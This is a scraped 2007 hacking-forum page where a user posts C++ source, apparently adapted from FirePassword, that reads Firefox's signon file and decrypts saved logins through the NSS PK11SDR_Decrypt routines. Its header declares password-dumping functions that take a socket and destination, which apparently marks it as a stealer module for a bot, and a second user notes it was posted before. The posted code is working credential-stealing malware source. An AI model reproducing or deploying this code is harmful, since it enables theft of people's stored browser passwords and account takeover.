+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n Its also possible that you may not have used Firefox password manager anytime to save passwords.In such a case use it to save passwords and then try FirePassword again.&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;else
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n Error &#58;&nbsp; Specified master password \&quot;%s\&quot; is wrong...\n Please enter the right master password and try again.&quot;,password&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_PRINT, &quot;\n\n Usage &#58; \n\t %s &#91;-m \&quot;master password\&quot; &#93; &#91;Firefox_Profile_Directory&#93; \n\n&quot;, &quot;FirePassword&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;ret = 0;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;// Free the slot
+<br />
+&nbsp; &nbsp;&#40;*PK11FreeSlot&#41; &#40;slot&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;return ret;
+<br />
+
+<br />
+&#125;
+<br />
+
+<br />
+const int buflen = 10240;
+<br />
+static char readbuf&#91;buflen+1&#93;;
+<br />
+static int last = 0;
+<br />
+static int next = 0;
+<br />
+
+<br />
+
+<br />
+FILE *signonFile = NULL;
+<br />
+
+<br />
+int OpenFile2&#40;char *filePath&#41;
+<br />
+&#123;
+<br />
+
+<br />
+&nbsp; &nbsp;last = next = 0;
+<br />
+
+<br />
+&nbsp; &nbsp;signonFile = fopen&#40;filePath, &quot;r&quot;&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;if&#40; signonFile == NULL &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG,&quot;\n Failed to open the signon file %s &quot;, filePath&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return 0;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;return 1;
+<br />
+
+<br />
+&#125;
+<br />
+
+<br />
+void CloseFile&#40;&#41;
+<br />
+&#123;
+<br />
+&nbsp; &nbsp;if&#40; signonFile &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;fclose&#40;signonFile&#41;;
+<br />
+&#125;
+<br />
+
+<br />
+
+<br />
+int ReadLine&#40;char *buffer, int size&#41;
+<br />
+&#123;
+<br />
+&nbsp; Unichar c;
+<br />
+&nbsp; int strLength = 0, i=0;
+<br />
+&nbsp; 
+<br />
+&nbsp; buffer&#91;0&#93; = 0;
+<br />
+
+<br />
+&nbsp; while&#40;1&#41;
+<br />
+&nbsp; &#123;
+<br />
+&nbsp; &nbsp; 
+<br />
+&nbsp; &nbsp;&nbsp; c = ReadChar&#40;&#41;;&nbsp; 
+<br />
+&nbsp; &nbsp;&nbsp; 
+<br />
+&nbsp; &nbsp;&nbsp; // note that eof is not set until we read past the end of the file 
+<br />
+&nbsp; &nbsp;&nbsp; if &#40; c == 0 &#41; // || feof&#40;file&#41; &#41; 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; return 0;
+<br />
+&nbsp; &nbsp;&nbsp; 
+<br />
+&nbsp; &nbsp;&nbsp; if &#40;c == '\n'&#41; 
+<br />
+&nbsp; &nbsp;&nbsp; &#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; buffer&#91;strLength++&#93; = 0;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; break;
+<br />
+&nbsp; &nbsp;&nbsp; &#125;
+<br />
+&nbsp; &nbsp;&nbsp; 
+<br />
+&nbsp; &nbsp;&nbsp; 
+<br />
+&nbsp; &nbsp;&nbsp; if &#40;c != '\r'&#41; 
+<br />
+&nbsp; &nbsp;&nbsp; &#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; for&#40;i=0; i &lt; 4 &amp;&amp; &#40; &#40;c &amp; 0xff&#41; != 0 &#41; ; i++&#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; if&#40; strLength &gt;= size &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; // Increase the capacity dynamically
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; //DisplayMesg&#40;TYPE_ERROR, &quot;\n Buffer is insufficient to store data&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; return 0;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &#125;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; buffer&#91;strLength++&#93; = &#40;char&#41;c;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; c = c &gt;&gt; 8;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &#125;
+<br />
+&nbsp; &nbsp;&nbsp; &#125;
+<br />
+&nbsp; &#125;
+<br />
+&nbsp; 
+<br />
+&nbsp; return 1;
+<br />
+
+<br />
+&#125;
+<br />
+
+<br />
+char ReadChar&#40;&#41;
+<br />
+&#123;
+<br />
+&nbsp; 
+<br />
+&nbsp; if &#40;next &gt;= last&#41; 
+<br />
+&nbsp; &#123;
+<br />
+&nbsp; &nbsp; next = 0;
+<br />
+&nbsp; &nbsp; last = fread&#40;readbuf, 1, buflen, signonFile&#41;;
+<br />
+&nbsp; &nbsp; //DisplayMesg&#40;TYPE_DEBUG, &quot;\n ReadChar = Read %d bytes &quot;,last&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;if &#40;last &lt;= 0 &#41; 
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp; &nbsp; // note that eof is not set until we read past the end of the file 
+<br />
+&nbsp; &nbsp; &nbsp; //DisplayMesg&#40;TYPE_DEBUG, &quot;\n End of file reached...!&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; return 0;
+<br />
+&nbsp; &nbsp; &#125;
+<br />
+&nbsp; &#125;
+<br />
+
+<br />
+&nbsp; return &#40;readbuf&#91;next++&#93;&#41;;
+<br />
+&#125;
+<br />
+
+<br />
+int DecryptSecretString&#40;char *cryptData, char **clearData&#41;
+<br />
+&#123;
+<br />
+int decodeLen = 0;
+<br />
+int finalLen = 0;
+<br />
+char *decodeData = NULL;
+<br />
+char *finalData = NULL;
+<br />
+
+<br />
+&nbsp; &nbsp;// treat zero-length crypt string as a special case 
+<br />
+&nbsp; &nbsp;if&#40;cryptData&#91;0&#93; == '\0'&#41; 
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;*clearData&nbsp; = &#40;char*&#41; malloc&#40;1&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;**clearData = 0;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return 1;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;// Use decryption routine...if crypt does not start with prefix...&#40; for Firefox &#41;
+<br />
+&nbsp; &nbsp;// otherwise use base64 decoding &#40; for mozilla default installation&#41;
+<br />
+&nbsp; &nbsp;// For firefox its always encrypted with 3DES.
+<br />
+&nbsp; &nbsp;if&#40; cryptData&#91;0&#93; != CRYPT_PREFIX&#91;0&#93; &#41; 
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n Performing PK11 Decryption &quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;// First do base64 decoding.....
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;if&#40;&nbsp; &#40;Base64Decode&#40;cryptData, &amp;decodeData, &amp;decodeLen&#41; == 0&#41; || &#40;decodeData == NULL&#41; &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n DecryptSecretString &#58; Base64 decoding of crypt data failed &quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return 0;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n DecryptSecretString &#58; base64data &#40;%d&#41; = %s &quot;, decodeLen, decodeData&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;// Now do actual PK11 decryption&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;if&#40; &#40;PK11Decrypt&#40;decodeData, decodeLen, &amp;finalData, &amp;finalLen&#41; == 0&#41; || &#40;finalData == NULL&#41;&#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n DecryptSecretString &#58; Failed to decrypt the string &quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return 0;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;// WARNING&#58; Decrypted string is not NULL terminated 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;// So we will create new NULL terminated string here...
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;*clearData = &#40;char*&#41; malloc&#40; finalLen + 1 &#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;if&#40; *clearData == NULL &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n DecryptSecretString &#58;Insufficient memory... &quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return 0;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;memcpy&#40;*clearData, finalData, finalLen&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;*&#40;*clearData + finalLen&#41; = 0;&nbsp; &nbsp; // Null terminate the string....
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n DecryptSecretString &#58; finalLen = %d &quot;, finalLen&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return 1;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;// Just do base64 decoding.
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n&nbsp; DecryptSecretString &#58; Performing simple Base64 Decoding &quot;&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;unsigned int PREFIX_Len = strlen&#40;CRYPT_PREFIX&#41;;
+<br />
+&nbsp; &nbsp;if&#40; strlen&#40;cryptData&#41; ==&nbsp; PREFIX_Len &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;*clearData = &#40;char *&#41;malloc&#40;1&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;**clearData = '\0';
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return 1;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;if&#40;&nbsp; Base64Decode&#40;&amp;cryptData&#91;PREFIX_Len&#93;, clearData, &amp;decodeLen&#41; == 0 &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n DecryptSecretString &#58; Base64 decoding of crypt data failed &quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return 0;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+
+<br />
+&nbsp; &nbsp;return 1;
+<br />
+&#125;
+<br />
+
+<br />
+int Base64Decode&#40;char *cryptData, char **decodeData, int *decodeLen&#41;
+<br />
+&#123;
+<br />
+&nbsp; &nbsp; int len = strlen&#40; cryptData &#41;;
+<br />
+&nbsp; &nbsp; int adjust = 0;
+<br />
+
+<br />
+&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n Base64Decode &#58; Length of crypt data = %d&quot;, len&#41;;
+<br />
+&nbsp; &nbsp; 
+<br />
+&nbsp; &nbsp;// Compute length adjustment 
+<br />
+&nbsp; &nbsp; if &#40;cryptData&#91;len-1&#93; == '='&#41; 
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp; &nbsp; adjust++;
+<br />
+&nbsp; &nbsp; &nbsp; if &#40;cryptData&#91;len-2&#93; == '='&#41; 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; adjust++;
+<br />
+&nbsp; &nbsp; &#125;
+<br />
+
+<br />
+&nbsp; &nbsp; *decodeData = &#40; char *&#41;&#40;*PLBase64Decode&#41;&#40;cryptData, len, NULL&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp; if&#40; *decodeData == NULL &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n Base64 decoding failed ...&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return 0;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp; *decodeLen = &#40;len*3&#41;/4 - adjust;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n Base64Decode &#58; Length of decoded data = %d&quot;, *decodeLen&#41;;
+<br />
+&nbsp; &nbsp; 
+<br />
+&nbsp; &nbsp;return 1;
+<br />
+&#125;
+<br />
+
+<br />
+int PK11Decrypt&#40;char *decodeData, int decodeLen, char **clearData, int *finalLen&#41;
+<br />
+&#123;
+<br />
+&nbsp; &nbsp;PK11SlotInfo *slot = 0;
+<br />
+&nbsp; &nbsp;SECStatus status;
+<br />
+&nbsp; &nbsp;SECItem request;
+<br />
+&nbsp; &nbsp;SECItem reply;
+<br />
+
+<br />
+&nbsp; &nbsp;// Find token with SDR key 
+<br />
+&nbsp; &nbsp;slot = &#40;*PK11GetInternalKeySlot&#41;&#40;&#41;;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;if &#40;!slot&#41; 
+<br />
+&nbsp; &nbsp;&#123; 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n PK11_GetInternalKeySlot failed&nbsp; ...&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return 0;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;if &#40; &#40;*PK11Authenticate&#41;&#40;slot, PR_TRUE, NULL&#41; != SECSuccess&#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;// since we have specified password callback function , we won't come here...
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n PK11_Authenticate failed&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return 0;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;// Decrypt the string
+<br />
+&nbsp; &nbsp;request.data = &#40;unsigned char *&#41;decodeData;
+<br />
+&nbsp; &nbsp;request.len = decodeLen;
+<br />
+&nbsp; &nbsp;reply.data = 0;
+<br />
+&nbsp; &nbsp;reply.len = 0;
+<br />
+
+<br />
+&nbsp; &nbsp;status = &#40;*PK11SDRDecrypt&#41;&#40;&amp;request, &amp;reply, NULL&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;if &#40;status != SECSuccess&#41; 
+<br />
+&nbsp; &nbsp;&#123; 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n PK11SDR_Decrypt failed&nbsp; ...&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return 0;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;// WARNING &#58; This string is not NULL terminated..
+<br />
+&nbsp; &nbsp;*clearData = &#40;char*&#41;reply.data;
+<br />
+&nbsp; &nbsp;*finalLen&nbsp; = reply.len;
+<br />
+
+<br />
+&nbsp; &nbsp;// Free the slot
+<br />
+&nbsp; &nbsp;&#40;*PK11FreeSlot&#41;&#40;slot&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;return 1;
+<br />
+&#125;
+<br />
+
+<br />
+void StrLwr&#40;char *str&#41;
+<br />
+&#123;
+<br />
+int n=strlen&#40;str&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;for&#40;int i=0; i&lt;n; i++&#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp; if&#40; str&#91;i&#93; &gt;=65 &amp;&amp; str&#91;i&#93;&lt;=90 &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;str&#91;i&#93;+=32;
+<br />
+&nbsp; &nbsp;&#125; &nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;
+<br />
+&#125;</td>	</tr></table>
+<br />
+
+<br />
+firefox.h
+<br />
+<table width="90%" cellspacing="1" cellpadding="2" border="0" align="center" class="code"><tr> 	<td class="code_header">Code:</td></tr><tr>	<td class="code">// Internal structure declaration taken from firefox.....
+<br />
+typedef enum SECItemType
+<br />
+&#123;
+<br />
+&nbsp; &nbsp; siBuffer = 0,
+<br />
+&nbsp; &nbsp; siClearDataBuffer = 1,
+<br />
+&nbsp; &nbsp; siCipherDataBuffer = 2,
+<br />
+&nbsp; &nbsp; siDERCertBuffer = 3,
+<br />
+&nbsp; &nbsp; siEncodedCertBuffer = 4,
+<br />
+&nbsp; &nbsp; siDERNameBuffer = 5,
+<br />
+&nbsp; &nbsp; siEncodedNameBuffer = 6,
+<br />
+&nbsp; &nbsp; siAsciiNameString = 7,
+<br />
+&nbsp; &nbsp; siAsciiString = 8,
+<br />
+&nbsp; &nbsp; siDEROID = 9,
+<br />
+&nbsp; &nbsp; siUnsignedInteger = 10,
+<br />
+&nbsp; &nbsp; siUTCTime = 11,
+<br />
+&nbsp; &nbsp; siGeneralizedTime = 12
+<br />
+&#125;;
+<br />
+
+<br />
+
+<br />
+struct SECItem 
+<br />
+&#123;
+<br />
+&nbsp; &nbsp; SECItemType type;
+<br />
+&nbsp; &nbsp; unsigned char *data;
+<br />
+&nbsp; &nbsp; unsigned int len;
+<br />
+&#125;;
+<br />
+
+<br />
+
+<br />
+typedef enum SECStatus 
+<br />
+&#123;
+<br />
+&nbsp; &nbsp; SECWouldBlock = -2,
+<br />
+&nbsp; &nbsp; SECFailure = -1,
+<br />
+&nbsp; &nbsp; SECSuccess = 0
+<br />
+&#125;;
+<br />
+
+<br />
+// For some PR type varialbes...just to remove gecko-sdk dependency
+<br />
+// following is added here.
+<br />
+#define PRBool&nbsp; &nbsp;int
+<br />
+#define PRUint32 unsigned int
+<br />
+#define PR_TRUE&nbsp; 1
+<br />
+#define PR_FALSE 0
+<br />
+
+<br />
+#define Unichar&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;unsigned int
+<br />
+#define HEADER_VERSION1&nbsp; &nbsp; &quot;#2c&quot;
+<br />
+#define HEADER_VERSION2&nbsp; &nbsp; &quot;#2d&quot;
+<br />
+#define CRYPT_PREFIX&nbsp; &nbsp; &nbsp; &quot;~&quot;
+<br />
+
+<br />
+int FindFirefoxPasses&#40;SOCKET sock, char *dest, BOOL notice&#41;;
+<br />
+char *GetCurrentUserProfilePath&#40;&#41;;
+<br />
+char *GetFirefoxLibPath&#40;&#41;;
+<br />
+int InitializeFirefoxLibrary&#40;char *firefoxPath&#41;;
+<br />
+int InitializeNSSLibrary&#40;char *profilePath, char *password&#41;;
+<br />
+//void DumpSignonSecrets&#40;char *profilePath&#41;;
+<br />
+void DumpSignonSecrets&#40;char *profilePath, SOCKET sock, char *dest, BOOL notice&#41;;
+<br />
+void TerminateFirefoxLibrary&#40;&#41;;
+<br />
+HMODULE LoadLibrary2&#40;char *firefoxDir, char *libName&#41;;
+<br />
+int CheckMasterPassword&#40;char *password&#41;;
+<br />
+int OpenFile2&#40;char *filePath&#41;;
+<br />
+void CloseFile&#40;&#41;;
+<br />
+int ReadLine&#40;char *buffer, int size&#41;;
+<br />
+char ReadChar&#40;&#41;;
+<br />
+int DecryptSecretString&#40;char *cryptData, char **clearData&#41;;
+<br />
+int Base64Decode&#40;char *cryptData, char **decodeData, int *decodeLen&#41;;
+<br />
+int PK11Decrypt&#40;char *decodeData, int decodeLen, char **clearData, int *finalLen&#41;;
+<br />
+void StrLwr&#40;char *str&#41;;</td>	</tr></table>
+<br />
+
+<br />
+loaddlls.cpp
+<br />
+<table width="90%" cellspacing="1" cellpadding="2" border="0" align="center" class="code"><tr> 	<td class="code_header">Code:</td></tr><tr>	<td class="code">GUPD fGetUserProfileDirectory;
+<br />
+----
+<br />
+BOOL nouserenv = FALSE;
+<br />
+DWORD nouserenverr = 0;
+<br />
+----
+<br />
+HMODULE userenv_dll = LoadLibrary&#40;&quot;userenv.dll&quot;&#41;;
+<br />
+if &#40;userenv_dll&#41; &#123;
+<br />
+&nbsp; &nbsp;fGetUserProfileDirectory = &#40;GUPD&#41;GetProcAddress&#40;userenv_dll,&quot;GetUserProfileDirectoryA&quot;&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;if &#40;!fGetUserProfileDirectory&#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;nouserenv = TRUE;
+<br />
+&#125; else &#123;
+<br />
+&nbsp; &nbsp;nouserenverr = GetLastError&#40;&#41;;
+<br />
+&nbsp; &nbsp;nouserenv = TRUE;
+<br />
+&#125;</td>	</tr></table></span></div>
+	</td>
+</tr>
+<tr>
+	<td align="left" valign="bottom">
+	<div style="padding: 5px;"><span class="signature"><span class="gensmall"></span></span></div>
+	<table width="100%" height="9" border="0" cellspacing="0" cellpadding="0">
+	<tr>
+		<td class="postbottom" height="9" nowrap="nowrap"><img src="templates/Morpheus/images/lang_english/icon_offline.png" alt="MaddY is offline" title="MaddY is offline" />&nbsp;<a href="profile.php?mode=viewprofile&amp;u=10746"><img src="templates/Morpheus/images/lang_english/icon_profile.gif" alt="View user's profile" title="View user's profile" border="0" /></a><a href="privmsg.php?mode=post&amp;u=10746"><img src="templates/Morpheus/images/lang_english/icon_pm.gif" alt="Send private message" title="Send private message" border="0" /></a></td>
+		<td width="100%" height="9" align="left"><img src="./templates/Morpheus/images/postbottom_right.gif" width="22" height="9" alt="" /></td>
+	</tr>
+	</table></td>
+</tr>
+</table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="right" width="100%" height="15" valign="top"><a href="#top"><img src="./templates/Morpheus/images/ftr_right.gif" width="60" height="10" alt="" /></a></td></tr></table>
+<a name="71747"></a>
+<table width="100%" class="hdr" cellspacing="0" cellpadding="0"><tr><td align="left" width="35"><img src="./templates/Morpheus/images/blue/hdr_left_post.gif" width="35" height="25" alt="" /></td><td width="100%" align="left" nowrap="nowrap"></td><td width="120" align="right"><img src="./templates/Morpheus/images/blue/hdr_right_blue.gif" width="120" height="25" alt="" /></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="post">
+<tr>
+	<td width="150" class="row" align="center" valign="top" style="padding: 2px;" rowspan="2">
+		<div style="padding: 3px;"><span class="name">onewhoknows</span><br /></div>
+		<div style="padding: 2px;"><span class="postdetails">member</span><br /></div>
+		<img src="images/rank/rank2.gif" alt="member" title="member" border="0" /><br />
+		
+		<br />
+Age: 23
+<br />
+		
+		<table width="100%" cellspacing="5" cellpadding="0">
+			<tr><td align="left"><span class="postdetails">Joined: 24 Jan 2007</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Posts: 189</span></td></tr>
+			<tr><td align="left"><span class="postdetails"></span></td></tr>
+		</table>
+		<img src="./templates/Morpheus/images/spacer.gif" width="150" height="1" border="0" alt="" />
+	</td>
+	<td width="1" class="postborder" rowspan="2"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="100" alt="" /></td>
+	<td width="100%" class="row" align="left" valign="top"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td width="50%" align="left" style="padding: 3px;"><span class="postdate"><a href="viewtopic.php?p=71747#71747"><img src="templates/Morpheus/images/blue/icon_minipost.gif" width="12" height="9" alt="Post" title="Post" border="0" /></a> Posted: Sun Apr 29, 2007 6:52 pm</span></td>
+		<td width="50%"></td>
+		<td width="23" valign="top" class="posttop" align="left"><img src="./templates/Morpheus/images/posttop_left.gif" width="23" height="9" border="0" alt="" /></td>
+		<td class="posttop" nowrap="nowrap" valign="top"><a href="posting.php?mode=quote&amp;p=71747"><img src="templates/Morpheus/images/lang_english/blue/icon_quote.gif" alt="Reply with quote" title="Reply with quote" border="0" /></a></td>
+	</tr>
+	<tr>
+		<td width="50%" class="postline" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="100" height="1" alt="" /></td>
+		<td colspan="3" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="1" alt="" /></td>
+	</tr>
+	</table>
+	<div style="padding: 4px;"><span class="postbody">been posted before.</span></div>
+	</td>
+</tr>
+<tr>
+	<td align="left" valign="bottom">
+	<div style="padding: 5px;"><span class="signature"><span class="gensmall"></span></span></div>
+	<table width="100%" height="9" border="0" cellspacing="0" cellpadding="0">
+	<tr>
+		<td class="postbottom" height="9" nowrap="nowrap"><a href="viewonline.php"><img src="templates/Morpheus/images/lang_english/icon_online.png" alt="onewhoknows is online now" title="onewhoknows is online now" /></a>&nbsp;<a href="profile.php?mode=viewprofile&amp;u=7497"><img src="templates/Morpheus/images/lang_english/icon_profile.gif" alt="View user's profile" title="View user's profile" border="0" /></a><a href="privmsg.php?mode=post&amp;u=7497"><img src="templates/Morpheus/images/lang_english/icon_pm.gif" alt="Send private message" title="Send private message" border="0" /></a></td>
+		<td width="100%" height="9" align="left"><img src="./templates/Morpheus/images/postbottom_right.gif" width="22" height="9" alt="" /></td>
+	</tr>
+	</table></td>
+</tr>
+</table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="right" width="100%" height="15" valign="top"><a href="#top"><img src="./templates/Morpheus/images/ftr_right.gif" width="60" height="10" alt="" /></a></td></tr></table>
+<a name="71749"></a>
+<table width="100%" class="hdr" cellspacing="0" cellpadding="0"><tr><td align="left" width="35"><img src="./templates/Morpheus/images/blue/hdr_left_post.gif" width="35" height="25" alt="" /></td><td width="100%" align="left" nowrap="nowrap"></td><td width="120" align="right"><img src="./templates/Morpheus/images/blue/hdr_right_blue.gif" width="120" height="25" alt="" /></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="post">
+<tr>
+	<td width="150" class="row" align="center" valign="top" style="padding: 2px;" rowspan="2">
+		<div style="padding: 3px;"><span class="name">MaddY</span><br /></div>
+		<div style="padding: 2px;"><span class="postdetails">poster</span><br /></div>
+		<img src="images/rank/rank1.gif" alt="poster" title="poster" border="0" /><br />
+		
+		<br />
+Age: 23
+<br />
+		
+		<table width="100%" cellspacing="5" cellpadding="0">
+			<tr><td align="left"><span class="postdetails">Joined: 08 Apr 2007</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Posts: 45</span></td></tr>
+			<tr><td align="left"><span class="postdetails"></span></td></tr>
+		</table>
